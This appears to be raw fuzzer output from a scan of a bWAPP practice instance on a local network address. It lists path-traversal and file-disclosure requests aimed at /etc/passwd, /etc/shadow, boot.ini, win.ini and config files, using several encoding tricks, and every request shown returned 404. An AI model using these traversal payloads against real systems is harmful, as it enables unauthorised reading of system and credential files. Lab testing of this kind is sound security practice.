157,404,9L,39W,http://192.168.1.86/bWAPP/config.asp
162,404,9L,39W,http://192.168.1.86/bWAPP/../config.php
164,404,9L,39W,http://192.168.1.86/bWAPP/../config.inc.php
159,404,9L,39W,http://192.168.1.86/bWAPP/_config.php
166,404,9L,39W,http://192.168.1.86/bWAPP/../config.asp
169,404,9L,39W,http://192.168.1.86/bWAPP//admin/install.php
165,404,9L,39W,http://192.168.1.86/bWAPP//config.asp
170,404,9L,39W,http://192.168.1.86/bWAPP/../install.php
173,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
175,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
177,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
183,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
179,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
190,404,9L,39W,http://192.168.1.86/bWAPP/..\../..\../boot.ini
189,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//boot.ini
184,404,9L,39W,http://192.168.1.86/bWAPP//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
192,404,9L,39W,http://192.168.1.86/bWAPP/\…..\\\…..\\\…..\\\
187,404,9L,39W,http://192.168.1.86/bWAPP//..\..\..\..\..\..\winnt\win.ini
71,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../etc/passwd%00
95,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../../etc/passwd%00
196,404,9L,39W,http://192.168.1.86/bWAPP/d:\AppServ\MySQL
198,404,9L,39W,http://192.168.1.86/bWAPP/c:\AppServ\MySQL
206,404,9L,39W,http://192.168.1.86/bWAPP//C:/inetpub/ftproot/
202,404,9L,40W,http://192.168.1.86/bWAPP//C:\Program%20Files\
200,404,9L,39W,http://192.168.1.86/bWAPP/c:WINDOWS/system32/
208,404,9L,39W,http://192.168.1.86/bWAPP//boot/grub/grub.conf
211,404,9L,39W,http://192.168.1.86/bWAPP//proc/cpuinfo
